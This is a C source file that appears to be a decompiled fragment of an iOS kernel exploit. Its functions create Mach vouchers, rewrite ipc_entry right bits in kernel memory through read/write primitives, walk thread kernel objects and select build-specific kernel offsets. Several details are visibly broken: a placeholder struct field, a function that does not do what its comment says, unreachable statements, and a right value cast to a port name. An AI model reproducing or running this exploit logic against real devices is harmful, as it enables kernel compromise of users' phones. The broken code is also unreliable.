/* record_0x90001_voucher_port.c
 * sub_36248..sub_3796c — voucher creation, port-limit helpers,
 * mach_port_allocate wrappers, ipc_entry manipulation, thread-kobj
 * port-table ops, and version-gated offset resolvers.
 */
#include <stdint.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <mach/mach.h>
#include <mach/host_priv.h>
/* proc_pidinfo is available via libproc on iOS */
extern int proc_pidinfo(int pid, int flavor, uint64_t arg, void *buffer, int buffersize);
#define PROC_PIDTBSDINFO 3
struct proc_bsdinfo {
    uint32_t pbi_flags;
    uint32_t pbi_status;
    uint32_t pbi_xstatus;
    uint32_t pbi_pid;
    uint32_t pbi_ppid;
    uint32_t pbi_uid;
    uint32_t pbi_gid;
    uint32_t pbi_ruid;
    uint32_t pbi_rgid;
    uint32_t pbi_svuid;
    uint32_t pbi_svgid;
    uint32_t rfu_1;
    char     pbi_comm[16];
    char     pbi_name[32];
    uint32_t pbi_nfiles;
    uint32_t pbi_pgid;
    uint32_t pbi_pjobc;
    uint32_t e_tdev;
    uint32_t e_tpgid;
    int32_t  pbi_nice;
    uint64_t pbi_start_tvsec;
    uint64_t pbi_start_tvusec;
    /* ... rest unused */
    int32_t  pbi_openfd; /* not in real struct; placeholder */
};

/* forward decl */
static kern_return_t sub_36330(int target);
extern int  sub_28840(long state, long addr, long *out);
extern int  sub_288a4(long state, long addr, long val);
extern int  sub_2572c(long state, long addr, uint32_t sz, void *out);
extern int  sub_2a188(long state, long addr, void *val, int sz);
extern int  sub_2a0d0(long state, long addr, long val);
extern int  sub_295b4(long state, long addr, int *out);
extern int  sub_28dfc(long state, long addr, int val);
extern long sub_1972c(long state, long addr);
extern long sub_32c78(long state, long port);
extern long sub_32d6c(long state, mach_port_name_t name);
extern long sub_32820(long state, long h);
extern long sub_33a1c(long state, mach_port_name_t name);
extern long sub_354a4(long state, long port);
extern long sub_35e18(long state, long base, int delta);
extern int  sub_29b78(long state, long h, long *out);
extern long sub_29cb0(long state, long h);
extern long sub_2a200(long state, long h, uint32_t *out);
extern int  sub_248e4(long *ctx);
extern int  sub_24954(long *ctx, uint32_t val);
extern int  sub_24ad0(long *ctx, void *buf, size_t sz);
extern int  sub_24b38(long *ctx, int a, uint32_t b, int c);
extern void sub_24908(long *ctx);
extern long sub_24fc0(void *p, mach_port_name_t n, long *out);
extern int  sub_1f274(uint32_t n, long *out);
extern int  sub_1f308(long h, uint32_t a, uint32_t b, const char *c);
extern int  sub_1f418(long h, void **p, mach_port_name_t *n);
extern void sub_1f4a4(void);

/* ── sub_36248 — host_create_mach_voucher wrapper ───────────────── */
int sub_36248(long state, long recipe, mach_port_t *out)
{
    /* recipe is a 0x18-byte buffer built by caller */
    mach_port_t host = mach_host_self();
    return host_create_mach_voucher(host, (mach_voucher_attr_raw_recipe_array_t)recipe,
                                    0x18, out) == KERN_SUCCESS;
    (void)state;
}

/* ── sub_3629c — ensure open-file-descriptor headroom ───────────────
 * proc_pidinfo(PROC_PIDTBSDINFO) returns current fd count;
 * if below param_2, calls sub_36330 to raise the limit.          */
uint32_t sub_3629c(long state, uint32_t needed)
{
    struct proc_bsdinfo bi;
    memset(&bi, 0, sizeof(bi));
    int r = proc_pidinfo(getpid(), PROC_PIDTBSDINFO, 0, &bi, sizeof(bi));
    if (r != (int)sizeof(bi)) {
        int e = errno;
        uint32_t v = (uint32_t)(e < 0 ? -e : e);
        return v | 0x40000000u;
    }
    if (bi.pbi_nfiles < needed) {
        uint32_t kr = sub_36330((int)needed);
        return kr ? (kr | 0x80000000u) : 0;
    }
    return 0;
    (void)state;
}

/* ── sub_36330 — mach_port_allocate + mod_refs to raise fd limit ── */
static kern_return_t sub_36330(int target)
{
    mach_port_name_t name = 0;
    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &name);
    if (kr == KERN_SUCCESS)
        mach_port_mod_refs(mach_task_self(), name, MACH_PORT_RIGHT_RECEIVE, -1);
    (void)target;
    return kr;
}

/* ── sub_363e4 — ensure fd headroom (variant: uses high-water) ───── */
uint32_t sub_363e4(long state, uint32_t needed)
{
    struct proc_bsdinfo bi;
    memset(&bi, 0, sizeof(bi));
    int r = proc_pidinfo(getpid(), PROC_PIDTBSDINFO, 0, &bi, sizeof(bi));
    if (r != (int)sizeof(bi)) {
        int e = errno;
        uint32_t v = (uint32_t)(e < 0 ? -e : e);
        return v | 0x40000000u;
    }
    if (bi.pbi_openfd < (int)needed) {
        uint32_t kr = sub_36330((int)(needed - (uint32_t)bi.pbi_openfd) + bi.pbi_nfiles);
        return kr ? (kr | 0x80000000u) : 0;
    }
    return 0;
    (void)state;
}

/* ── sub_36480 — ipc_entry port-right manipulation ──────────────────
 * Reads the port right type from the ipc_entry, validates it is a
 * send right (0x40000), rewrites it to a dead-name (0x10000), then
 * allocates a new port, inserts the original right, and adjusts
 * mod_refs so the caller ends up with a fresh send right.         */
long sub_36480(long state, long entry_addr, mach_port_name_t *out)
{
    ipc_space_t task = mach_task_self();
    uint32_t flags = 0;
    if (!sub_295b4(state, entry_addr, (int *)&flags)) return 0x2800f;
    if ((int)flags >= 0) return 0x28008;

    uint64_t ver = *(uint64_t *)(state + 0x158);
    uint32_t mask = (ver > 0x1f52ffffffffffffULL) ?
                    (ver < 0x1f541900000000ULL ? 0x400000u : 0x200000u) : 0;

    if (mask) {
        uint32_t v2 = 0;
        if (!sub_295b4(state, entry_addr + 8, (int *)&v2)) return 0x2800f;
        (void)v2;
    }

    /* find ipc_entry kobj */
    long kobj = sub_32c78(state, (long)(uintptr_t)task);
    if (!kobj) return 0x2800e;
    long table = sub_32820(state, kobj);
    if (!table) return 0x2802c;

    int stride = *(int *)(state + 0x168);
    long slot_addr = table + (long)stride * 3;

    /* read current right type bits */
    uint32_t rtype = 0;
    if (!sub_295b4(state, slot_addr, (int *)&rtype)) return 0x2800f;
    if ((rtype & 0x1f0000) != 0x40000) return 0x28011;

    /* rewrite to dead-name */
    uint32_t newval = (rtype & 0xffe0ffffu) | 0x10000u;
    if (!sub_28dfc(state, slot_addr, (int)newval)) return 0x28010;

    /* allocate new port and insert right */
    mach_port_name_t newname = 0;
    for (int i = 0; i < 9; i++) {
        kern_return_t kr = mach_port_allocate(task, MACH_PORT_RIGHT_RECEIVE, &newname);
        if (kr) break;
        kr = mach_port_mod_refs(task, newname, MACH_PORT_RIGHT_RECEIVE, -1);
        if (kr) break;
        mach_port_t poly = (mach_port_t)rtype; /* original right */
        kr = mach_port_insert_right(task, newname, poly, MACH_MSG_TYPE_COPY_SEND);
        if (kr == KERN_SUCCESS) {
            /* fix up ipc_entry bits */
            if ((flags >> 10) & 1)
                sub_28dfc(state, entry_addr, (int)(flags & ~0x400u));
            long kobj2 = sub_32d6c(state, (mach_port_name_t)rtype);
            if (!kobj2) return 0x2800e;
            uint32_t v3 = 0;
            if (!sub_295b4(state, kobj2 + 8, (int *)&v3)) return 0x2800f;
            if ((v3 & 0x1f0000) != 0x10000) return 0x28011;
            uint32_t v4 = (v3 & 0xffe0ffffu) | 0x100000u;
            if (!sub_28dfc(state, kobj2 + 8, (int)v4)) return 0x28010;
            mach_port_mod_refs(task, (mach_port_name_t)rtype, MACH_PORT_RIGHT_SEND_ONCE, -1);
            *out = newname;
            return 0;
        }
    }
    return 0x28010;
}

/* ── sub_36c10 — voucher recipe builder + port kobj walk ────────────
 * Builds a mach_voucher via host_create_mach_voucher, then walks
 * the resulting port's kernel object chain to locate a thread kobj.
 * Returns the thread kobj address or 0 on failure.               */
long sub_36c10(long state, uint32_t port_name)
{
    long ctx = 0;
    uint32_t n = port_name;
    if (!sub_1f274(n << 1, &ctx)) return 0;

    if (sub_1f308(ctx, 0x1000000, 4, NULL)) goto out;
    if (sub_1f308(ctx, 0x8000000, 4, "key")) goto out;

    mach_port_name_t vport = 0;
    long vport_out = 0;
    if (sub_1f418(ctx, (void **)&vport_out, &vport)) goto out;

    sub_1f4a4();

    long kobj = 0;
    mach_port_name_t vn = (mach_port_name_t)vport_out;
    long h = sub_24fc0((void *)vport_out, vn, &vport_out);
    if ((mach_port_name_t)h + 1 < 2) goto cleanup;

    long p = sub_32c78(state, h);
    if (!p) goto cleanup;
    long v = 0;
    if (!sub_28840(state, p + 0x10, &v)) goto cleanup;
    if (!sub_1972c(state, v)) goto cleanup;
    if (!sub_28840(state, v + 0x18, &v)) goto cleanup;
    if (!sub_1972c(state, v)) goto cleanup;
    if (!sub_28840(state, v + 0x20, &v)) goto cleanup;
    if (!sub_1972c(state, v)) goto cleanup;
    if (!sub_28840(state, v + (long)*(int *)(state + 0x168), &v)) goto cleanup;
    if (!sub_1972c(state, v)) goto cleanup;

    long thr = 0;
    if (!sub_28840(state, v + 0x18, &thr)) goto cleanup;
    thr = sub_1972c(state, thr);
    if (!thr) goto cleanup;
    if (!sub_2a0d0(state, v + 0x18, 0)) goto cleanup;
    kobj = thr;

cleanup:
    if (vport_out) free((void *)vport_out);
    if ((mach_port_name_t)h + 1 >= 2)
        mach_port_deallocate(mach_task_self(), (mach_port_name_t)h);
    if (vport + 1 >= 2)
        mach_port_deallocate(mach_task_self(), vport);
    return kobj;
out:
    sub_1f4a4();
    return 0;
}

/* ── sub_36e4c — mach_port_request_notification + ipc_entry fixup ──
 * Allocates a port, sets up a dead-name notification, then adjusts
 * the ipc_entry right-type bits in the kernel.                    */
long sub_36e4c(long state, long entry_addr, uint32_t count)
{
    uint64_t ver = *(uint64_t *)(state + 0x158);
    ipc_space_t task = mach_task_self();

    if (ver < 0x1f541e00000000ULL) {
        mach_port_name_t name = 0;
        kern_return_t kr = mach_port_allocate(task, MACH_PORT_RIGHT_RECEIVE, &name);
        if (kr) return (long)(kr | 0x80000000u);

        long ctx[3] = {0, 0, 0};
        if (sub_248e4(ctx)) goto fail_name;
        if (sub_24954(ctx, 0xffffffff)) goto fail_ctx;

        /* build voucher recipe and map */
        long mapped = 0;
        if (!sub_24ad0(ctx, &mapped, (size_t)count)) goto fail_ctx;
        if (sub_24b38(ctx, 0, (uint32_t)mapped, 0)) goto fail_ctx;
        sub_24908(ctx);

        /* walk thread kobj */
        long thr = sub_354a4(state, (long)name);
        if (!thr) goto fail_name;
        long v = 0;
        if (!sub_28840(state, thr, &v)) goto fail_name;
        if (!sub_1972c(state, v)) goto fail_name;

        uint64_t ver2 = *(uint64_t *)(state + 0x158);
        if (ver2 > 0x1c1b0a800fffffULL) {
            long off = ver2 < 0x1c1b1914600000ULL ? 0x18 : 0x10;
            if (!sub_28840(state, v + off, &v)) goto fail_name;
            if (!sub_1972c(state, v)) goto fail_name;
        }

        int stride = *(int *)(state + 0x168);
        uint16_t rtype = 0;
        if (!sub_2572c(state, thr + 8 + (long)stride, 2, &rtype)) goto fail_name;
        if (rtype == 1) {
            if (!sub_288a4(state, thr, 0)) goto fail_name;
            uint16_t newtype = (uint16_t)(mach_port_name_t)name;
            if (!sub_2a188(state, thr + 8 + (long)stride, &newtype, 2)) goto fail_name;
            long kobj2 = sub_32d6c(state, (mach_port_name_t)mapped);
            if (!kobj2) goto fail_name;
            sub_35e18(state, kobj2, -1);
            mach_port_mod_refs(task, name, MACH_PORT_RIGHT_RECEIVE, -1);
            return v;
        }
fail_ctx:
        sub_24908(ctx);
fail_name:
        mach_port_mod_refs(task, name, MACH_PORT_RIGHT_RECEIVE, -1);
        return 0;
    }

    /* newer path: vm_deallocate cleanup */
    if (entry_addr) vm_deallocate(task, (vm_address_t)entry_addr, count);
    return 0;
}

/* ── sub_37210 — thread kobj port-table entry resolver ──────────────
 * Walks the thread's ipc_space to find a matching port-table entry,
 * optionally updating the entry's right-type bits.
 * Returns the thread kobj or 0 on failure.                        */
long sub_37210(long state, uint32_t *port_inout)
{
    uint64_t ver = *(uint64_t *)(state + 0x158);
    uint32_t port = *port_inout;

    if (ver <= 0x1f541dffffffULL) return 0;

    int build = *(int *)(state + 0x140);
    int stride = *(int *)(state + 0x168);

    /* version-gated stride multipliers */
    long mul_a = 0, mul_b = 0;
    if (ver < 0x22580a06c00000ULL &&
        (ver < 0x1f543c40800000ULL || build > 0x2257)) {
        mul_a = 0;
        mul_b = (long)stride;
    } else {
        mul_a = (long)stride;
        mul_b = 0;
    }

    mach_port_name_t tmp = 0;
    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &tmp);
    if (kr) return 0;

    long kobj = sub_32d6c(state, tmp);
    if (!kobj) goto out;
    long table = sub_32820(state, kobj);
    if (!table) goto out;
    table += (long)stride * 3;

    /* request dead-name notification */
    mach_port_t prev = 0;
    kr = mach_port_request_notification(mach_task_self(), tmp,
             MACH_NOTIFY_DEAD_NAME, 0, (mach_port_name_t)tmp,
             MACH_MSG_TYPE_MAKE_SEND_ONCE, &prev);
    if (kr) goto out;
    kr = mach_port_request_notification(mach_task_self(), tmp,
             MACH_NOTIFY_DEAD_NAME, 0, 0,
             MACH_MSG_TYPE_MAKE_SEND_ONCE, &prev);
    if (kr) goto out;
    if (MACH_PORT_VALID(prev)) {
        mach_port_deallocate(mach_task_self(), prev);
        prev = 0;
    }

    /* walk ipc_space entries */
    long out_kobj = 0;
    long local[3] = {0, 0, 0};
    if (!sub_29b78(state, table, local)) goto out;
    long chain = sub_29cb0(state, local[0]);
    if (ver > 0x22580a06bfffffULL) {
        uint32_t idx = 0;
        chain = sub_2a200(state, chain, &idx);
    }

    /* scan for matching entry */
    uint32_t sz = port + 0x4c;
    if (sz <= 0x100u - (uint32_t)(uintptr_t)chain) {
        /* inline path */
    } else {
        void *buf = calloc(sz, 1);
        if (!buf) goto out;
        if ((sz & 3) == 0) {
            long ctx2[3] = {0, 0, 0};
            if (!sub_248e4(ctx2)) {
                if (!sub_24ad0(ctx2, buf, sz)) {
                    if (!sub_24b38(ctx2, 0, (uint32_t)(uintptr_t)buf, 0)) {
                        sub_24908(ctx2);
                        long thr = sub_354a4(state, (long)tmp);
                        if (thr) {
                            long v = 0;
                            if (sub_28840(state, thr, &v) && sub_1972c(state, v)) {
                                if (ver > 0x1c1b0a800fffffULL) {
                                    long off = ver < 0x1c1b1914600000ULL ? 0x18 : 0x10;
                                    if (sub_28840(state, v + off, &v) && sub_1972c(state, v)) {
                                        uint16_t rtype = 0;
                                        if (sub_2572c(state, thr + 8 + mul_a + mul_b, 2, &rtype) && rtype == 1) {
                                            if (sub_288a4(state, thr, 0)) {
                                                uint16_t nv = (uint16_t)port;
                                                if (sub_2a188(state, thr + 8 + mul_a + mul_b, &nv, 2)) {
                                                    long k2 = sub_32d6c(state, (mach_port_name_t)(uintptr_t)buf);
                                                    if (k2) {
                                                        sub_35e18(state, k2, -1);
                                                        out_kobj = v;
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    } else sub_24908(ctx2);
                }
            }
        }
        free(buf);
    }

    if (out_kobj && port != *port_inout)
        *port_inout = port;

out:
    mach_port_mod_refs(mach_task_self(), tmp, MACH_PORT_RIGHT_RECEIVE, -1);
    return out_kobj;
}

/* ── sub_3796c — version-gated thread-kobj field offset table ───────
 * Fills 4 version-dependent offsets used by the thread-kobj walkers.
 * Returns 0 on success, error code on unsupported build.         */
long sub_3796c(long state, uint32_t *o1, uint32_t *o2, uint32_t *o3, uint32_t *o4)
{
    uint64_t ver = *(uint64_t *)(state + 0x158);
    int build = *(int *)(state + 0x140);
    uint32_t cap = *(uint32_t *)state;

    int a, b, c, d;

    if (ver > 0x22580a06bfffffULL) {
        int alt = (cap & 0x84000) != 0;
        a = alt ? 0x16c : 0x174;
        b = alt ? 0x210 : 0x280;
        c = alt ? 0x1b4 : 0x224;
        d = alt ? 0x184 : 0x18c;
    } else if (ver > 0x1f530f027fffffULL) {
        int alt = (cap & 0x84000) != 0;
        a = alt ? 0x17c : 0x180;
        b = alt ? 0x220 : 0x290;
        c = alt ? 0x1c4 : 0x230;
        d = 0x194;
    } else if (build == 0x1c1b) {
        int alt = (cap & 0x84000) != 0;
        a = alt ? 0x16c : 0x174;
        b = alt ? 0x280 : 0x288;
        c = alt ? 0x22c : 0x234;
        d = alt ? 0x184 : 0x18c;
    } else if (build == 0x1809) {
        a = 0x16c; b = 0x280; c = 0x22c; d = 0x184;
    } else {
        return 0x2802c;
    }

    if (o1) *o1 = (uint32_t)a;
    if (o2) *o2 = (uint32_t)b;
    if (o3) *o3 = (uint32_t)c;
    if (o4) *o4 = (uint32_t)d;
    return 0;
}
